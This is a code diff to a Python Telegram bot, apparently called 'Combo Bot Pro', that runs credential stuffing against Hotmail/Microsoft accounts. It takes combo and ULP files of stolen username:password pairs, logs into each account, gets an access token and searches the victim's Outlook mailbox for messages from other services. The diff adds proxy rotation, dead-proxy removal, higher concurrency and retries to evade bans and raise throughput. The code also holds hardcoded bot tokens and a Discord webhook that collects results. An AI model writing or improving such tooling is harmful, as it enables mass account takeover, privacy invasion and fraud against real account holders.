@@ -6,9 +6,12 @@ import sqlite3
 import json
 import aiohttp
 import urllib3
+import random
+import threading
 from datetime import datetime, timedelta
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
+from flask import Flask, jsonify
 
 # Disable insecure request warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -19,11 +22,57 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 API_TOKEN = "8814848831:AAEo3Ui19kB30X93-Cuzugzoi4rdfvpwCjw"
 ADMIN_ID = 8703458182
 ADMIN_USERNAME = "lxhds"
-CHANNEL_USERNAME = "@lsueusuds"
+CHANNEL_USERNAME = "lsueusuds"
 CHANNEL_URL = "https://t.me/lsueusuds"
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1544679115054129282/9BRgzgVo7ipiW6rhxfaECuQDl9vytlVg0ZojCt0_NuLNgMjIh0kDda1EhyVPNvooi5CO"
 
 bot = AsyncTeleBot(API_TOKEN)
+
+# ═══════════════════════════════════════════════════════════
+# FLASK APP (Web Server)
+# ═══════════════════════════════════════════════════════════
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return jsonify({
+        "status": "running",
+        "bot": "Combo Bot Pro",
+        "service": "hotmail_checker",
+        "timestamp": datetime.now().isoformat()
+    })
+
+@app.route('/health')
+def health():
+    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
+
+@app.route('/stats')
+def stats():
+    try:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute("SELECT COUNT(*) FROM users")
+        total_users = cursor.fetchone()[0]
+        cursor.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
+        total_vips = cursor.fetchone()[0]
+        cursor.execute("SELECT COUNT(*) FROM hotmail_checks")
+        total_checks = cursor.fetchone()[0]
+        cursor.execute("SELECT SUM(hits) FROM hotmail_checks")
+        total_hits = cursor.fetchone()[0] or 0
+        conn.close()
+        return jsonify({
+            "total_users": total_users,
+            "total_vips": total_vips,
+            "total_checks": total_checks,
+            "total_hits": total_hits
+        })
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+def run_flask():
+    port = int(os.environ.get('PORT', 8080))
+    print(f"[*] Flask server starting on port {port}...")
+    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
 # ═══════════════════════════════════════════════════════════
 # EMOJI
@@ -48,7 +97,8 @@ EMOJI = {
     "shower": "🚿", "bathtub": "🛁", "razor": "🪒", "lotion": "🧴",
     "nail_care": "💅", "barber": "💈", "ballet": "🩰", "athletic": "🥋",
     "trophy2": "🏆", "medal": "🏅", "military": "🎖️", "crown2": "👑",
-    "jewel": "💎", "ring": "💍", "gem": "💎",
+    "jewel": "💎", "ring": "💍", "gem": "💎", "proxy": "🌐",
+    "speed": "🚀", "network": "📡",
 }
 
 # ═══════════════════════════════════════════════════════════
@@ -91,7 +141,7 @@ LANGS = {
         "hotmail_check_file_btn": "🔥 فحص آخر ملف ULP تلقائياً",
         "hotmail_send_file_btn": "📎 إرسال ملف Combo جديد",
         "hotmail_processing": f"{EMOJI['flame']} <b>جاري الفحص الذكي لحسابات Hotmail...</b>\n⏳ <b>يرجى الانتظار، قد يستغرق الأمر بضع دقائق.</b>",
-        "hotmail_progress": f"{EMOJI['flame']} <b>تقدم الفحص الذكي:</b>\n\n{{bar}}\n\n{EMOJI['check']} <b>صحيحة (Hits):</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>مخصصة (Custom):</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>فاشلة:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>إعادة المحاولة:</b> <code>{{retries}}</code>\n\n{EMOJI['timer']} <b>السرعة:</b> <code>{{speed:.1f}}</code> حساب/ثانية\n{EMOJI['hourglass']} <b>المنصات المكتشفة:</b> <code>{{platforms}}</code>",
+        "hotmail_progress": f"{EMOJI['flame']} <b>تقدم الفحص الذكي:</b>\n\n{{bar}}\n\n{EMOJI['check']} <b>صحيحة (Hits):</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>مخصصة (Custom):</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>فاشلة:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>إعادة المحاولة:</b> <code>{{retries}}</code>\n\n{EMOJI['timer']} <b>السرعة:</b> <code>{{speed:.1f}}</code> حساب/ثانية\n{EMOJI['hourglass']} <b>المنصات المكتشفة:</b> <code>{{platforms}}</code>\n{EMOJI['proxy']} <b>البروكسيات النشطة:</b> <code>{{proxies}}</code>",
         "hotmail_done": f"{EMOJI['trophy']} <b>اكتمل الفحص الذكي!</b>\n\n{EMOJI['check']} <b>صحيحة:</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>مخصصة:</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>فاشلة:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>إعادة المحاولة:</b> <code>{{retries}}</code>\n{EMOJI['chart']} <b>المجموع:</b> <code>{{total}}</code>\n{EMOJI['timer']} <b>المدة:</b> <code>{{elapsed:.1f}}s</code>",
         "hotmail_no_hits": f"{EMOJI['ghost']} لم يتم العثور على أي Hits.",
         "hotmail_auto_btn": "🔥 فحص Hotmail تلقائي لهذا الملف",
@@ -100,6 +150,13 @@ LANGS = {
         "hotmail_no_file": f"{EMOJI['warning']} لا يوجد ملف ULP سابق. يرجى استخراج كومبو أولاً أو إرسال ملف مباشرة.",
         "hotmail_file_received": f"{EMOJI['package']} <b>تم استلام الملف:</b> <code>{{filename}}</code>\n{EMOJI['chart']} <b>السطور:</b> <code>{{lines}}</code>\n\n{EMOJI['flame']} <b>اضغط الزر أدناه لبدء الفحص الذكي:</b>",
         "hotmail_start_btn": "🚀 ابدأ الفحص الذكي",
+        "proxy_menu_btn": "🌐 إدارة البروكسيات",
+        "proxy_welcome": f"{EMOJI['proxy']} <b>إدارة البروكسيات</b>\n\nأرسل ملف (ملفات) البروكسيات بصيغة .txt\n<b>الصيغة المدعومة:</b> <code>ip:port</code> أو <code>http://ip:port</code>\n\n{EMOJI['speed']} <b>البروكسيات المحملة:</b> <code>{{count}}</code>",
+        "proxy_file_received": f"{EMOJI['yes']} <b>تم استلام ملف البروكسيات:</b> <code>{{filename}}</code>\n{EMOJI['check']} <b>بروكسيات صالحة:</b> <code>{{count}}</code>",
+        "proxy_no_proxies": f"{EMOJI['warning']} لا يوجد بروكسيات محملة. سيتم استخدام الاتصال المباشر (أبطأ وقد يؤدي للحظر).",
+        "proxy_add_btn": "📎 إرسال ملف بروكسيات جديد",
+        "proxy_clear_btn": "🗑️ مسح جميع البروكسيات",
+        "proxy_cleared": f"{EMOJI['yes']} تم مسح جميع البروكسيات بنجاح.",
     },
     "en": {
         "sub_required": f"{EMOJI['warning']} You must subscribe to the bot channel first to use it!\n\n📌 Channel:",
@@ -137,7 +194,7 @@ LANGS = {
         "hotmail_check_file_btn": "🔥 Auto-Check Last ULP File",
         "hotmail_send_file_btn": "📎 Send New Combo File",
         "hotmail_processing": f"{EMOJI['flame']} <b>Smart Hotmail checking in progress...</b>\n⏳ <b>Please wait, this may take a few minutes.</b>",
-        "hotmail_progress": f"{EMOJI['flame']} <b>Smart Check Progress:</b>\n\n{{bar}}\n\n{EMOJI['check']} <b>Hits:</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>Custom:</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>Bad:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>Retries:</b> <code>{{retries}}</code>\n\n{EMOJI['timer']} <b>Speed:</b> <code>{{speed:.1f}}</code> acc/sec\n{EMOJI['hourglass']} <b>Platforms Found:</b> <code>{{platforms}}</code>",
+        "hotmail_progress": f"{EMOJI['flame']} <b>Smart Check Progress:</b>\n\n{{bar}}\n\n{EMOJI['check']} <b>Hits:</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>Custom:</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>Bad:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>Retries:</b> <code>{{retries}}</code>\n\n{EMOJI['timer']} <b>Speed:</b> <code>{{speed:.1f}}</code> acc/sec\n{EMOJI['hourglass']} <b>Platforms Found:</b> <code>{{platforms}}</code>\n{EMOJI['proxy']} <b>Active Proxies:</b> <code>{{proxies}}</code>",
         "hotmail_done": f"{EMOJI['trophy']} <b>Smart Check Complete!</b>\n\n{EMOJI['check']} <b>Hits:</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>Custom:</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>Bad:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>Retries:</b> <code>{{retries}}</code>\n{EMOJI['chart']} <b>Total:</b> <code>{{total}}</code>\n{EMOJI['timer']} <b>Duration:</b> <code>{{elapsed:.1f}}s</code>",
         "hotmail_no_hits": f"{EMOJI['ghost']} No Hits found.",
         "hotmail_auto_btn": "🔥 Auto Hotmail Check This File",
@@ -146,6 +203,13 @@ LANGS = {
         "hotmail_no_file": f"{EMOJI['warning']} No previous ULP file found. Please extract a combo first or send a file directly.",
         "hotmail_file_received": f"{EMOJI['package']} <b>File Received:</b> <code>{{filename}}</code>\n{EMOJI['chart']} <b>Lines:</b> <code>{{lines}}</code>\n\n{EMOJI['flame']} <b>Click below to start smart check:</b>",
         "hotmail_start_btn": "🚀 Start Smart Check",
+        "proxy_menu_btn": "🌐 Proxy Manager",
+        "proxy_welcome": f"{EMOJI['proxy']} <b>Proxy Manager</b>\n\nSend proxy file(s) in .txt format\n<b>Supported format:</b> <code>ip:port</code> or <code>http://ip:port</code>\n\n{EMOJI['speed']} <b>Loaded Proxies:</b> <code>{{count}}</code>",
+        "proxy_file_received": f"{EMOJI['yes']} <b>Proxy file received:</b> <code>{{filename}}</code>\n{EMOJI['check']} <b>Valid proxies:</b> <code>{{count}}</code>",
+        "proxy_no_proxies": f"{EMOJI['warning']} No proxies loaded. Will use direct connection (slower and may cause bans).",
+        "proxy_add_btn": "📎 Send New Proxy File",
+        "proxy_clear_btn": "🗑️ Clear All Proxies",
+        "proxy_cleared": f"{EMOJI['yes']} All proxies cleared successfully.",
     }
 }
 
@@ -283,6 +347,7 @@ admin_states = {}
 active_downloads = {}
 active_checks = {}
 DB_FILE = "database.db"
+PROXIES_DIR = "proxies"
 
 # Valid fields for update (SQL injection prevention)
 VALID_USER_FIELDS = {
@@ -322,8 +387,19 @@ def init_db():
             completed_at TEXT
         )
     """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS user_proxies (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            chat_id INTEGER,
+            file_path TEXT,
+            created_at TEXT
+        )
+    """)
     conn.commit()
     conn.close()
+    # Create proxies directory
+    if not os.path.exists(PROXIES_DIR):
+        os.makedirs(PROXIES_DIR)
 
 init_db()
 
@@ -407,6 +483,144 @@ def log_hotmail_check(chat_id, filename, status, hits=0, twofactor=0, custom=0, 
     conn.commit()
     conn.close()
 
+def save_proxy_file(chat_id, file_path):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    now = datetime.now().isoformat()
+    cursor.execute("INSERT INTO user_proxies (chat_id, file_path, created_at) VALUES (?, ?, ?)",
+                   (chat_id, file_path, now))
+    conn.commit()
+    conn.close()
+
+def get_user_proxy_files(chat_id):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT file_path FROM user_proxies WHERE chat_id = ?", (chat_id,))
+    rows = cursor.fetchall()
+    conn.close()
+    return [row[0] for row in rows if os.path.exists(row[0])]
+
+def clear_user_proxies(chat_id):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT file_path FROM user_proxies WHERE chat_id = ?", (chat_id,))
+    rows = cursor.fetchall()
+    for row in rows:
+        try:
+            if os.path.exists(row[0]):
+                os.remove(row[0])
+        except:
+            pass
+    cursor.execute("DELETE FROM user_proxies WHERE chat_id = ?", (chat_id,))
+    conn.commit()
+    conn.close()
+
+def count_user_proxies(chat_id):
+    files = get_user_proxy_files(chat_id)
+    count = 0
+    for fp in files:
+        try:
+            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    line = line.strip()
+                    if line and ':' in line:
+                        count += 1
+        except:
+            pass
+    return count
+
+# ═══════════════════════════════════════════════════════════
+# PROXY MANAGER - Smart Proxy Rotation & Dead Removal
+# ═══════════════════════════════════════════════════════════
+class ProxyManager:
+    def __init__(self, chat_id=None):
+        self.chat_id = chat_id
+        self.proxies = []
+        self.dead_proxies = set()
+        self.lock = asyncio.Lock()
+        self.load_proxies()
+
+    def load_proxies(self):
+        """Load proxies from user's saved files or global proxies directory"""
+        self.proxies = []
+        files_to_load = []
+
+        if self.chat_id:
+            files_to_load = get_user_proxy_files(self.chat_id)
+
+        # Also load from global proxies directory
+        if os.path.exists(PROXIES_DIR):
+            for f in os.listdir(PROXIES_DIR):
+                if f.endswith('.txt'):
+                    files_to_load.append(os.path.join(PROXIES_DIR, f))
+
+        for fp in set(files_to_load):
+            if not os.path.exists(fp):
+                continue
+            try:
+                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+                    for line in f:
+                        line = line.strip()
+                        if not line or line.startswith('#'):
+                            continue
+                        # Normalize proxy format
+                        proxy = self._normalize_proxy(line)
+                        if proxy:
+                            self.proxies.append(proxy)
+            except Exception as e:
+                print(f"[!] Error loading proxy file {fp}: {e}")
+
+        # Remove duplicates while preserving order
+        seen = set()
+        unique = []
+        for p in self.proxies:
+            if p not in seen:
+                seen.add(p)
+                unique.append(p)
+        self.proxies = unique
+        print(f"[*] Loaded {len(self.proxies)} unique proxies")
+
+    def _normalize_proxy(self, proxy_str):
+        """Normalize proxy string to aiohttp format"""
+        proxy_str = proxy_str.strip()
+        if not proxy_str:
+            return None
+
+        # If already has protocol
+        if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
+            return proxy_str
+
+        # If format is ip:port
+        if ':' in proxy_str and not proxy_str.startswith('http'):
+            # Check if it has auth user:pass@ip:port
+            if '@' in proxy_str:
+                return f"http://{proxy_str}"
+            else:
+                return f"http://{proxy_str}"
+
+        return None
+
+    async def get_proxy(self):
+        """Get a random alive proxy"""
+        async with self.lock:
+            available = [p for p in self.proxies if p not in self.dead_proxies]
+            if not available:
+                return None
+            return random.choice(available)
+
+    async def mark_dead(self, proxy):
+        """Mark a proxy as dead"""
+        async with self.lock:
+            self.dead_proxies.add(proxy)
+            print(f"[!] Proxy marked dead: {proxy[:30]}...")
+
+    async def get_alive_count(self):
+        async with self.lock:
+            return len([p for p in self.proxies if p not in self.dead_proxies])
+
+    def has_proxies(self):
+        return len(self.proxies) > 0
+
 # ═══════════════════════════════════════════════════════════
 # DISCORD WEBHOOK
 # ═══════════════════════════════════════════════════════════
@@ -447,12 +661,13 @@ async def send_file_to_discord(file_path, filename, target_info, count, user_inf
         return False
 
 # ═══════════════════════════════════════════════════════════
-# ASYNC HOTMAIL CHECKER CLASS (Fixed: uses aiohttp instead of requests)
+# ASYNC HOTMAIL CHECKER CLASS (Restructured with Proxies & Speed)
 # ═══════════════════════════════════════════════════════════
 class AsyncHotmailChecker:
-    def __init__(self, chat_id, bot_instance):
+    def __init__(self, chat_id, bot_instance, proxy_manager=None):
         self.chat_id = chat_id
         self.bot = bot_instance
+        self.proxy_manager = proxy_manager
         self.hits = 0
         self.bad = 0
         self.custom = 0
@@ -469,6 +684,9 @@ class AsyncHotmailChecker:
         self.last_update = 0
         self.combo_file = None
         self.hits_file = None
+        # Concurrency control - adjust based on proxy count
+        max_concurrent = 20 if (proxy_manager and proxy_manager.has_proxies()) else 5
+        self.semaphore = asyncio.Semaphore(max_concurrent)
 
     def make_progress_bar(self, percentage):
         percentage = max(0.0, min(100.0, percentage))
@@ -477,13 +695,18 @@ class AsyncHotmailChecker:
         bar = "█" * filled + "▒" * empty
         return f"[{bar}] {percentage:.1f}%"
 
-    async def _check_account(self, username, password):
+    async def _check_account(self, username, password, session, max_retries=3):
+        """Check single account with proxy rotation and retry logic"""
         if self.cancelled:
             return "CANCELLED"
-        try:
-            timeout = aiohttp.ClientTimeout(total=30)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                # Step 1: Login
+
+        for attempt in range(max_retries):
+            proxy_url = None
+            if self.proxy_manager:
+                proxy_url = await self.proxy_manager.get_proxy()
+
+            try:
+                # Step 1: Login to Microsoft
                 login_url = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={username}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
                 payload = {
                     'ps': '2', 'psRNGCDefaultType': '', 'psRNGCEntropy': '', 'psRNGCSLK': '',
@@ -507,14 +730,16 @@ class AsyncHotmailChecker:
                     'Cookie': 'MSPRequ=id=N&lt=1716447264&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-13a3c70b-5026-45a1-84df-99ba880a29e1'
                 }
 
-                try:
-                    async with session.post(login_url, data=payload, headers=headers, allow_redirects=False) as response:
-                        response_text = await response.text()
-                        cookies = response.cookies
-                        response_headers = response.headers
-                except Exception:
-                    return "RETRY"
+                kwargs = {}
+                if proxy_url:
+                    kwargs['proxy'] = proxy_url
 
+                async with session.post(login_url, data=payload, headers=headers, allow_redirects=False, **kwargs) as response:
+                    response_text = await response.text()
+                    cookies = response.cookies
+                    response_headers = response.headers
+
+                # Check for immediate failures
                 if "Your account or password is incorrect." in response_text or \
                    "That Microsoft account doesn't exist." in response_text or \
                    "Sign in to your Microsoft account" in response_text:
@@ -553,7 +778,7 @@ class AsyncHotmailChecker:
                 if not refresh_token:
                     return "BAD"
 
-                # Step 2: Get token
+                # Step 2: Get access token
                 token_url = "https://login.live.com/oauth20_token.srf"
                 token_payload = {
                     'grant_type': 'refresh_token',
@@ -572,21 +797,18 @@ class AsyncHotmailChecker:
                     'Accept-Encoding': 'gzip'
                 }
 
-                try:
-                    async with session.post(token_url, data=token_payload, headers=token_headers) as token_response:
-                        if token_response.status != 200:
+                async with session.post(token_url, data=token_payload, headers=token_headers, **kwargs) as token_response:
+                    if token_response.status != 200:
+                        return "BAD"
+                    try:
+                        token_data = await token_response.json()
+                        access_token = token_data.get('access_token')
+                        if not access_token:
                             return "BAD"
-                        try:
-                            token_data = await token_response.json()
-                            access_token = token_data.get('access_token')
-                            if not access_token:
-                                return "BAD"
-                        except:
-                            return "BAD"
-                except Exception:
-                    return "RETRY"
+                    except:
+                        return "BAD"
 
-                # Step 3: Search emails
+                # Step 3: Search emails for services
                 outlook_headers = {
                     'User-Agent': 'Outlook-Android/2.0',
                     'Pragma': 'no-cache',
@@ -603,6 +825,7 @@ class AsyncHotmailChecker:
                 for email, service in SV.items():
                     if self.cancelled:
                         return "CANCELLED"
+
                     search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                     search_payload = {
                         "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
@@ -643,7 +866,7 @@ class AsyncHotmailChecker:
                     }
 
                     try:
-                        async with session.post(search_url, json=search_payload, headers=outlook_headers) as search_response:
+                        async with session.post(search_url, json=search_payload, headers=outlook_headers, **kwargs) as search_response:
                             if search_response.status == 200:
                                 search_data = await search_response.json()
                                 total_msgs = 0
@@ -675,31 +898,59 @@ class AsyncHotmailChecker:
                 else:
                     return "CUSTOM"
 
-        except Exception:
-            return "RETRY"
+            except aiohttp.ClientProxyConnectionError:
+                if proxy_url and self.proxy_manager:
+                    await self.proxy_manager.mark_dead(proxy_url)
+                if attempt < max_retries - 1:
+                    await asyncio.sleep(1)
+                    continue
+                return "RETRY"
+            except asyncio.TimeoutError:
+                if proxy_url and self.proxy_manager:
+                    await self.proxy_manager.mark_dead(proxy_url)
+                if attempt < max_retries - 1:
+                    await asyncio.sleep(1)
+                    continue
+                return "RETRY"
+            except Exception as e:
+                print(f"[!] Check error for {username}: {e}")
+                if attempt < max_retries - 1:
+                    await asyncio.sleep(0.5)
+                    continue
+                return "RETRY"
 
-    async def check_account(self, username, password):
-        result = await self._check_account(username, password)
+        return "RETRY"
 
-        async with self.lock:
-            self.checked += 1
-            if result == "HIT":
-                self.hits += 1
-            elif result in ["BAD", "BAN"]:
-                self.bad += 1
-            elif result == "2FA":
-                self.twofactor += 1
-            elif result == "CUSTOM":
-                self.custom += 1
-            elif result == "RETRY":
-                self.retries += 1
+    async def check_account(self, username, password, session):
+        """Wrapper with semaphore and stats tracking"""
+        async with self.semaphore:
+            if self.cancelled:
+                return "CANCELLED"
 
-        now = time.time()
-        if (self.checked % 3 == 0 or now - self.last_update > 5) and self.status_msg_id:
-            self.last_update = now
-            await self.update_status()
+            result = await self._check_account(username, password, session)
 
-        return result
+            async with self.lock:
+                self.checked += 1
+                if result == "HIT":
+                    self.hits += 1
+                elif result in ["BAD", "BAN"]:
+                    self.bad += 1
+                elif result == "2FA":
+                    self.twofactor += 1
+                elif result == "CUSTOM":
+                    self.custom += 1
+                elif result == "RETRY":
+                    self.retries += 1
+
+            now = time.time()
+            update_interval = 2 if self.total > 100 else 3
+            if (self.checked % 5 == 0 or now - self.last_update > update_interval) and self.status_msg_id:
+                self.last_update = now
+                await self.update_status()
+
+            # Small delay to avoid overwhelming servers
+            await asyncio.sleep(0.05)
+            return result
 
     async def update_status(self):
         try:
@@ -715,10 +966,12 @@ class AsyncHotmailChecker:
                 for svc in hit.get("services", []):
                     self.all_platforms.add(svc)
 
+            proxy_count = await self.proxy_manager.get_alive_count() if self.proxy_manager else 0
+
             text = t['hotmail_progress'].format(
                 bar=bar, hits=self.hits, twofactor=self.twofactor,
                 custom=self.custom, bad=self.bad, retries=self.retries,
-                speed=speed, platforms=platforms_count
+                speed=speed, platforms=platforms_count, proxies=proxy_count
             )
             markup = InlineKeyboardMarkup()
             markup.add(InlineKeyboardButton(t['hotmail_cancel'], callback_data="hotmail_cancel"))
@@ -743,12 +996,13 @@ class AsyncHotmailChecker:
         if self.total == 0:
             return
 
-        for username, password in combos:
-            if self.cancelled:
-                break
-            await self.check_account(username, password)
-            await asyncio.sleep(0.3)
+        # Use shared session for connection pooling
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            tasks = [self.check_account(u, p, session) for u, p in combos]
+            await asyncio.gather(*tasks, return_exceptions=True)
 
+        # Save results
         if self.hit_results:
             hits_file = f"Hotmail_Hits_{self.chat_id}_{int(time.time())}.txt"
             with open(hits_file, "w", encoding="utf-8") as f:
@@ -844,7 +1098,13 @@ async def start_hotmail_check(chat_id, file_path, msg_id):
         await bot.edit_message_text(f"{EMOJI['no']} <b>لا يوجد كومبو صالح في الملف.</b>", chat_id, msg_id, parse_mode='HTML')
         return
 
-    checker = AsyncHotmailChecker(chat_id, bot)
+    # Initialize proxy manager for this user
+    proxy_manager = ProxyManager(chat_id)
+    if not proxy_manager.has_proxies():
+        # Try loading global proxies
+        proxy_manager = ProxyManager(None)
+
+    checker = AsyncHotmailChecker(chat_id, bot, proxy_manager)
     active_checks[chat_id] = checker
 
     markup = InlineKeyboardMarkup()
@@ -1040,6 +1300,7 @@ async def hotmail_menu_handler(call):
     if user.get("last_extracted_file") and os.path.exists(user["last_extracted_file"]):
         markup.add(InlineKeyboardButton(t['hotmail_check_file_btn'], callback_data="hotmail_auto_check"))
     markup.add(InlineKeyboardButton(t['hotmail_send_file_btn'], callback_data="hotmail_send_file"))
+    markup.add(InlineKeyboardButton(t['proxy_menu_btn'], callback_data="proxy_menu"))
     markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="back_to_home"))
 
     await bot.edit_message_text(t['hotmail_welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
@@ -1101,6 +1362,63 @@ async def hotmail_cancel_handler(call):
             pass
     else:
         await bot.answer_callback_query(call.id, "No active check.")
+
+# ═══════════════════════════════════════════════════════════
+# PROXY MENU HANDLERS
+# ═══════════════════════════════════════════════════════════
+@bot.callback_query_handler(func=lambda call: call.data == "proxy_menu")
+async def proxy_menu_handler(call):
+    await bot.answer_callback_query(call.id)
+    chat_id = call.message.chat.id
+    user = get_user(chat_id)
+    lang = user["lang"] or "ar"
+    t = LANGS[lang]
+
+    proxy_count = count_user_proxies(chat_id)
+    text = t['proxy_welcome'].format(count=proxy_count)
+
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton(t['proxy_add_btn'], callback_data="proxy_add"))
+    if proxy_count > 0:
+        markup.add(InlineKeyboardButton(t['proxy_clear_btn'], callback_data="proxy_clear"))
+    markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="hotmail_menu"))
+
+    await bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
+
+@bot.callback_query_handler(func=lambda call: call.data == "proxy_add")
+async def proxy_add_handler(call):
+    await bot.answer_callback_query(call.id)
+    chat_id = call.message.chat.id
+    user = get_user(chat_id)
+    lang = user["lang"] or "ar"
+    t = LANGS[lang]
+
+    user_states[chat_id] = {"step": "wait_proxy_file"}
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="proxy_menu"))
+    await bot.edit_message_text(
+        f"{EMOJI['proxy']} <b>أرسل ملف البروكسيات (.txt) الآن...</b>\n\n<i>Send your proxy file (.txt) now...</i>\n\n<b>Supported formats:</b>\n<code>ip:port</code>\n<code>http://ip:port</code>\n<code>http://user:pass@ip:port</code>",
+        chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML'
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data == "proxy_clear")
+async def proxy_clear_handler(call):
+    await bot.answer_callback_query(call.id)
+    chat_id = call.message.chat.id
+    user = get_user(chat_id)
+    lang = user["lang"] or "ar"
+    t = LANGS[lang]
+
+    clear_user_proxies(chat_id)
+    await bot.answer_callback_query(call.id, t['proxy_cleared'], show_alert=True)
+
+    # Refresh menu
+    proxy_count = 0
+    text = t['proxy_welcome'].format(count=proxy_count)
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton(t['proxy_add_btn'], callback_data="proxy_add"))
+    markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="hotmail_menu"))
+    await bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
 
 # ═══════════════════════════════════════════════════════════
 # ADMIN PANEL
@@ -1491,9 +1809,6 @@ async def start_url_processing(chat_id, msg_id):
         else:
             await bot.send_message(chat_id, t['discord_failed'], parse_mode='HTML')
 
-        # Keep file for hotmail auto-check, but don't delete immediately
-        # We keep it until next extraction or until bot restart
-
     except Exception as e:
         active_downloads[chat_id] = False
         user_states.pop(chat_id, None)
@@ -1503,7 +1818,7 @@ async def start_url_processing(chat_id, msg_id):
             pass
 
 # ═══════════════════════════════════════════════════════════
-# DOCUMENT HANDLER (for combo files)
+# DOCUMENT HANDLER (for combo files & proxy files)
 # ═══════════════════════════════════════════════════════════
 @bot.message_handler(content_types=['document'])
 async def handle_document(message: Message):
@@ -1514,6 +1829,41 @@ async def handle_document(message: Message):
 
     if user["banned"]: return
     if not user["lang"]: return
+
+    # Check if waiting for proxy file
+    if chat_id in user_states and user_states[chat_id].get("step") == "wait_proxy_file":
+        doc = message.document
+        if not doc.file_name.endswith('.txt'):
+            await bot.reply_to(message, f"{EMOJI['warning']} <b>يرجى إرسال ملف .txt فقط.</b>", parse_mode='HTML')
+            return
+
+        file_info = await bot.get_file(doc.file_id)
+        downloaded_file = await bot.download_file(file_info.file_path)
+
+        # Save to proxies directory with user ID
+        file_path = os.path.join(PROXIES_DIR, f"proxies_{chat_id}_{int(time.time())}.txt")
+        with open(file_path, 'wb') as f:
+            f.write(downloaded_file)
+
+        # Count valid proxies
+        valid_count = 0
+        try:
+            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    line = line.strip()
+                    if line and ':' in line and not line.startswith('#'):
+                        valid_count += 1
+        except:
+            pass
+
+        save_proxy_file(chat_id, file_path)
+        user_states.pop(chat_id, None)
+
+        text = t['proxy_file_received'].format(filename=doc.file_name, count=valid_count)
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="proxy_menu"))
+        await bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')
+        return
 
     # Check if waiting for hotmail file
     if chat_id in user_states and user_states[chat_id].get("step") == "wait_hotmail_file":
@@ -1551,10 +1901,16 @@ async def handle_document(message: Message):
 # MAIN
 # ═══════════════════════════════════════════════════════════
 async def main():
+    # Start Flask in background thread
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+
     print("[*] Bot is starting...")
     print(f"[*] Loaded {len(SV)} platforms for Hotmail checking")
     print(f"[*] Admin ID: {ADMIN_ID}")
     print(f"[*] Channel: {CHANNEL_USERNAME}")
